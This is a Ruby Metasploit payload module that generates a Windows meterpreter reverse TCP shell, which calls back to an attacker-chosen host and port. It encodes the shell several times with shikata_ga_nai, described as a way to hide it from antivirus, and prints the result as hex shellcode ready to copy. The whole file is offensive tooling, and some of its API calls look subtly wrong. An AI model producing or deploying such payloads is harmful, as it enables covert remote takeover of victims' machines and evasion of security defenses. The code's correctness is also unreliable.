#!/usr/bin/env ruby

require 'msf/core'
require 'msf/core/payload_generator'

class MetasploitModule < Msf::Payload
  include Msf::Payload::Single
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseTcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Payload Generator',
      'Description'    => %q{
        Makes a Windows reverse shell payload and wraps it in an encoder
        to help hide it from antivirus.
      },
      'Author'         => ['Ahmed Belhaj', 'Xavier'],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'SessionTypes'   => ['meterpreter']
    ))

    register_options([
      Opt::LHOST(),  # your IP for the reverse shell to connect back to
      Opt::LPORT(),  # your port for the shell to use
      OptString.new('ENCODER', [true, 'Which encoder to use', 'x86/shikata_ga_nai']),
      OptInt.new('ENCODER_ITERATIONS', [true, 'How many times to run the encoder', 3])
    ])
  end

  def generate
    # make a basic reverse TCP shell for Windows
    raw = Msf::Util::PayloadGenerator.generate(
      framework, 'windows/meterpreter/reverse_tcp',
      'LHOST' => datastore['LHOST'],
      'LPORT' => datastore['LPORT']
    )

    encoder_name = datastore['ENCODER']          # which encoder to use
    iterations   = datastore['ENCODER_ITERATIONS']  # how many times to run it
    print_status("[*] Making payload using #{encoder_name}")

    # get the encoder tool and use it to scramble the payload
    encoder = framework.encoders.create(encoder_name)
    encoded = encoder.encode(raw, iterations)

    # turn the encoded payload into hex format so it's easier to copy and use
    hex = encoded.unpack('H*')[0].scan(/../).map { |b| "\\x#{b}" }.join
    print_good("[+] Done! Hereâ€™s your encoded payload: #{hex}")

    encoded
  end
end
